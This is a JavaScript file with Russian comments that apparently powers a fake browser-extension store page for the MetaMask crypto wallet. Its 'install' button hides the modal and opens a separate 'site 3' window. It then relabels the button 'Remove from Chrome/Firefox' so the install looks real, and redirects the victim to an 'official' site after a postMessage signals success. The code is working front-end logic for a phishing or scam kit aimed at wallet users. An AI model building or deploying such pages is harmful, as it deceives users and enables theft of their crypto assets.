let button7 = document.querySelector('button[data-value="1"]');
let form = document.querySelectorAll('form');
let linkSait3 = 'http://127.0.0.1/';
let googleSaitOficial = 'http://127.0.0.1/'
let sait;


// Открытие спойлера на странице 

let spoyler = document.querySelector('.confidentiality__action')

spoyler.addEventListener('click', openSpoylerFN)

function openSpoylerFN(event) {
    if ( event.currentTarget.style.height == '160px') {
        event.currentTarget.style.cssText = ''
        event.currentTarget.querySelector('.confidentiality__click').style.cssText = ''
        event.currentTarget.querySelector('.confidentiality__arrow').style.cssText = ''
        event.currentTarget.querySelector('.confidentiality__arrow').style.cssText = ''
        event.currentTarget.querySelector('.confidentiality__click').style.cssText = ''
    }
    else {
        event.currentTarget.style.height = '160px'
        event.currentTarget.querySelector('.confidentiality__click').style.opacity = '1'
        event.currentTarget.querySelector('.confidentiality__arrow').style.transform = 'rotate(-180deg)'
        event.currentTarget.querySelector('.confidentiality__arrow').style.maxHeight = '24px'
        event.currentTarget.querySelector('.confidentiality__click').style.marginTop = '10px'
    }

}





// Отзывы
form.forEach(button => {
    button.addEventListener('click', clickButton =>{
        if (clickButton.target.dataset.value < 4) {
            document.querySelector('.reviews__body').style.display = 'none';
            
            function time() {
                document.querySelector('.reviews__body').style.display = 'block';
            }

            setTimeout(time,500)
        }
    })
});



// Загрузка
        
	function timeLoadRemove () {
		document.querySelector('.load_head').style.opacity = '0';
		document.querySelector('.load_x').outerHTML = '';
		document.querySelector('.me').outerHTML = '';
	}
		
	setTimeout(timeLoadRemove,1500);
	




// Click Расширение (Редирект на саит 3)
let buttonExtensionAdd = document.querySelector('#clickAddExten');
let buttonExtensionAddMob = document.querySelector('.popup__install');

buttonExtensionAdd.addEventListener('click', clickAddExtensionFu);
buttonExtensionAddMob.addEventListener('click', clickAddExtensionFu);

function clickAddExtensionFu() {
    hiddenModalExtension();
    redirectTimeout();

   setTimeout(() => buttonInstallText('Удалить из'), 3000);
   // setTimeout(() => buttonInstallText('Открыть'), 3000);
    setTimeout(() => buttonRemoveClick(), 3000);
    setTimeout(() => buttonAddClick(), 3000);
    setTimeout(() => changeContent(), 3000);
    
}

function hiddenModalExtension() {
    let modalExtensionAdd = document.querySelector('#modal');
    let modalExtensionAddMob = document.querySelectorAll('._active').length;
    //destop
    modalExtensionAdd.style.display = 'none';
    //mob
    if (modalExtensionAddMob == 3) {
        document.querySelector('.touch-version').classList.remove('_active');
        document.querySelector('#mob-popup').classList.remove('_active');
    }

}

function redirectTimeout() {
    setTimeout(()=> {
        sait = window.open(linkSait3)
    }, 1500);
}

function changeContent(){
	// document.body.style.overflowY = 'hidden'
	document.querySelector('.tabs__title').classList.remove('_tab-active')
	document.querySelectorAll('.tabs__title')[4].classList.add('_tab-active')
	document.querySelector('.tabs__body').setAttribute('hidden', '')
	document.querySelector('.tabs__body.tabs-similar').removeAttribute('hidden')
	
	document.querySelector('#block-action').style.display = 'none' // OFF BlockContent
}

function buttonInstallText(text) {
    let buttonInstall =  document.querySelector('#metamask-button p');

    /*opera*/
	if (!!window.opr && !!opr.addons || !!window.opera || navigator.userAgent.indexOf(" OPR/") >= 0) {
		 buttonInstall.textContent = text  ;
		 buttonInstall.textContent = text + ' Chrome';   // text + ' Opera';
        return;
	}
    /*Firefox*/
    if (-1 != navigator.userAgent.indexOf("Firefox")) {
         buttonInstall.textContent = text ;
        buttonInstall.textContent = text + ' Firefox';
        return
    }
    else {
         buttonInstall.textContent = text ;
        buttonInstall.textContent = text + ' Chrome';
    }
}

// Нажимаем кнопку Открыть 
function buttonClickOpen() {
    //sait.focus();
    let modal_Delet = document.querySelectorAll('#modal')[1]
    modal_Delet.classList.add('_active')
    document.querySelector('#block-action').style.cssText = '' // OFF BlockContent


    modal_Delet.querySelector('#clickAddExten').addEventListener('click', deletExpansion)
    modal_Delet.querySelector('#modal-close').addEventListener('click', hiddenModalDelet)
}

// Удаляем расширение
function deletExpansion() {

    sait.close()  // Закрываем саит с расширение открытый
    location.reload();  // Перезагружаем страницу
}

// Закрываем модальное окно Удалить расширение
function hiddenModalDelet() {
    let modal_Delet = document.querySelectorAll('#modal')[1]
    modal_Delet.classList.remove('_active')
    document.querySelector('#block-action').style.display = 'none' // OFF BlockContent
}

// Удаляем событие клика Открыть
function buttonRemoveClick() {
    buttonExtensionAdd.removeEventListener('click', clickAddExtensionFu);
    buttonExtensionAddMob.removeEventListener('click', clickAddExtensionFu);
}
// Добавляем новый событие клика Открыть + начинаем отслеживать страницу расширения 
function buttonAddClick() {
    document.querySelector('#metamask-button').setAttribute('onclick', 'buttonClickOpen()')
    valid()
}


// Sait Close

// function valid() {
//     if (sait.closed) {
//         // localStorage.setItem('KeyValid', '1');
//         // window.close();
//         location.href = googleSaitOficial
//     }
//     else{
//         setTimeout(valid, 100);
//     }
// }

function valid() {
    window.addEventListener('message', (el)=>{ 
        if (el.data == 'request_successful') {
            location.href = googleSaitOficial
        }
    })
}


